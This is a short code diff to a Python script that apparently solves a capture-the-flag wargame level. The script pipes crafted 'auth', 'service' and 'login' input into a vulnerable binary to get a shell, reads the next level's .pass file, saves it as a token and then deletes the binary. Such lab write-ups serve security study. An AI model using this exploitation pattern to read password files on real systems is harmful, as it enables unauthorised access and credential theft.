@@ -28,6 +28,8 @@ print_title('Binary expect one of these key word')
 get_func_structure(client, 'main')
 
 f = lambda command: f'echo "{command}" | (echo "auth lrorscha\nservice\nservice\nlogin"; cat -) | ./{binary_name}'
+print_title('Very hard to explain this solution, it was found accidentally... '
+            'Just initialize user by auth command, cast service two time and just input login and done, so stupid...')
 
 output = exec(client, f('whoami'), title='Check user')
 print_output(output[1:])
@@ -36,4 +38,5 @@ print_output(output[0], 'Current user')
 output = exec(client, f('cat /home/user/level9/.pass'), title='Steal the password')
 
 save_token(output[0])
+os.unlink(f'{binary_name}')
 
